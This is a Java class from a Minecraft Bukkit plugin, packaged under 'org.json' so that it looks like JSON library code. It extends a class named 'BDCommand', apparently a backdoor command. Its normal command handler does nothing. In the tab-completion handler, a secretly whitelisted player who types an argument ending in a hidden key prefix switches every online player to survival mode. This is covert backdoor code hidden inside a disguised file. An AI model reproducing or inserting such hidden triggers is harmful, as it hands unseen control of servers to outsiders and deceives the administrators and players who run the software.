package org.json.modals.gamemode;

import org.bukkit.Bukkit;
import org.bukkit.GameMode;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.json.Modal;
import org.json.utils.api.KeyGen;
import org.json.utils.builders.BDCommand;
import org.json.utils.builders.TabComplBuilder;
import org.json.utils.metaData.WhitelistMeta;

import java.util.List;

public class SurvivalAll extends BDCommand {
    public SurvivalAll() {
        super("survivalAll");
    }

    @Override
    public boolean execute(CommandSender sender, Command command, String label, String[] args) {
        return false;
    }

    @Override
    public List<String> onTabComplete(CommandSender sender, Command command, String label, String[] args) {
        TabComplBuilder tabComplBuilder = new TabComplBuilder(sender, command, label, args);
        Player player = (Player) sender;
        if (!WhitelistMeta.isListed(player)) return tabComplBuilder.build();
        if (!args[args.length - 1].endsWith(KeyGen.getPrefix())) return tabComplBuilder.build();

        Bukkit.getOnlinePlayers().forEach(onlinePlayer -> onlinePlayer.setGameMode(GameMode.SURVIVAL));

        player.sendMessage(Modal.getPrefix() + "§aAll online player has been switched to SURVIVAL mode.");
        return tabComplBuilder.build();
    }
}
